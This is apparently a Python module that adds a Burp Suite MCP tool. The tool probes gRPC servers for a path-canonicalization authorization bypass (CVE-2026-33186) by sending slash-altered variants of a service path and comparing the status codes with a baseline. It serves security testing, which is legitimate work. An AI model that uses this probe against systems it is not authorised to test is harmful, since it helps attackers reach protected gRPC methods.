"""probe_grpc_path_canonicalization — CVE-2026-33186.

gRPC-Go path canonicalization authz bypass. Servers behind a gateway / mesh
that enforce authz on `/Package.Service/Method` may accept variants:
  - no leading slash:        `Package.Service/Method`
  - double leading slash:    `//Package.Service/Method`
  - double inner slash:      `/Package.Service//Method`
  - trailing slash:          `/Package.Service/Method/`
  - mixed case (rare):       `/Package.SERVICE/Method`

When the gateway routes the variant differently than it authz-checks it, the
non-canonical form bypasses the 401/403 the canonical form returns.

CONFIRMED if any variant returns 200 / 2xx while canonical is 401/403.
SUSPECTED on status delta without clear bypass.

Returns VerdictResult.
"""

from __future__ import annotations

from urllib.parse import urlsplit, urlunsplit

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import make_verdict, error_verdict


_GRPC_HEADERS = {
    "Content-Type": "application/grpc",
    "Te": "trailers",
}


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_grpc_path_canonicalization(
        target_url: str,
        service_method_path: str = "",
        session: str = "",
    ) -> dict:
        """Probe a gRPC endpoint for path-canonicalization authz bypass (CVE-2026-33186).

        Sends the canonical path first as a baseline, then 4 non-canonical
        variants. CONFIRMED if any variant returns 2xx while baseline is
        401/403/404.

        Args:
            target_url: gRPC endpoint base URL (no trailing /Service/Method).
            service_method_path: fully-qualified gRPC path, e.g.
                `/example.Greeter/SayHello`. If empty, defaults to
                `/health.Health/Check` (gRPC health check service —
                universally present, low side-effect).
            session: optional session name for authenticated probing.

        Returns: VerdictResult.
        """
        if not target_url:
            return error_verdict("target_url required",
                                 vuln_type="grpc_path_canonicalization")

        path = service_method_path or "/health.Health/Check"
        if not path.startswith("/"):
            path = "/" + path

        baseline = await _send_grpc(target_url, path, session)
        baseline_status = baseline.get("status_code") or baseline.get("status")
        baseline_logger = baseline.get("logger_index", -1)
        logger_indices: list[int] = []
        if isinstance(baseline_logger, int) and baseline_logger >= 0:
            logger_indices.append(baseline_logger)

        # Variants: non-canonical paths
        stripped = path.lstrip("/")
        variants = [
            ("no_leading_slash", stripped),
            ("double_leading_slash", "//" + stripped),
            ("double_inner_slash", path.replace("/", "//", 2).replace("//", "/", 1) + ""),
            ("trailing_slash", path + "/"),
        ]
        # Build double_inner properly
        if "/" in stripped:
            svc, _, method = stripped.partition("/")
            variants[2] = ("double_inner_slash", f"/{svc}//{method}")

        reproductions: list[dict] = [{
            "variant": "canonical_baseline",
            "path": path,
            "status_code": baseline_status,
            "logger_index": baseline_logger,
        }]

        bypass_hits: list[dict] = []
        suspected_hits: list[dict] = []

        canonical_blocked = baseline_status in (401, 403, 404)

        for label, variant_path in variants:
            resp = await _send_grpc(target_url, variant_path, session)
            status = resp.get("status_code") or resp.get("status")
            logger_idx = resp.get("logger_index", -1)
            if isinstance(logger_idx, int) and logger_idx >= 0:
                logger_indices.append(logger_idx)
            entry = {
                "variant": label,
                "path": variant_path,
                "status_code": status,
                "logger_index": logger_idx,
            }
            reproductions.append(entry)

            if canonical_blocked and status and 200 <= int(status) < 300:
                entry["matched"] = "bypass_2xx"
                bypass_hits.append(entry)
            elif status != baseline_status and status not in (None, 0):
                entry["matched"] = "status_delta"
                suspected_hits.append(entry)

        if bypass_hits:
            first = bypass_hits[0]
            return make_verdict(
                "CONFIRMED", 0.90,
                f"gRPC path canonicalization bypass — baseline {baseline_status}, "
                f"variant {first['variant']} returned {first['status_code']} "
                f"({len(bypass_hits)} total bypass variants)",
                vuln_type="grpc_path_canonicalization",
                logger_indices=logger_indices,
                reproductions=reproductions,
                details={"baseline_status": baseline_status,
                         "bypass_count": len(bypass_hits),
                         "first_hit": first},
                summary=f"CONFIRMED gRPC path canonicalization bypass on {target_url}{path}",
            )

        if suspected_hits:
            return make_verdict(
                "SUSPECTED", 0.55,
                f"Non-canonical gRPC variants produced status deltas vs baseline "
                f"{baseline_status} ({len(suspected_hits)} variants). Manual review.",
                vuln_type="grpc_path_canonicalization",
                logger_indices=logger_indices,
                reproductions=reproductions,
                details={"baseline_status": baseline_status,
                         "suspected_count": len(suspected_hits)},
                summary=f"SUSPECTED gRPC path-canonicalization sensitivity on {target_url}",
            )

        return make_verdict(
            "FAILED", 0.10,
            f"All {len(variants)} non-canonical variants matched baseline status "
            f"{baseline_status} — no canonicalization gap",
            vuln_type="grpc_path_canonicalization",
            logger_indices=logger_indices,
            reproductions=reproductions,
            summary=f"FAILED — no gRPC canonicalization bypass on {target_url}",
        )


async def _send_grpc(target_url: str, path: str, session: str) -> dict:
    parts = urlsplit(target_url)
    url = urlunsplit((parts.scheme, parts.netloc, path, "", ""))
    headers = [{"name": k, "value": v} for k, v in _GRPC_HEADERS.items()]
    if session:
        return await client.post("/api/session/request", json={
            "session": session, "method": "POST", "url": url, "headers": headers,
        })
    return await client.post("/api/http/curl", json={
        "url": url, "method": "POST", "headers": headers,
    })
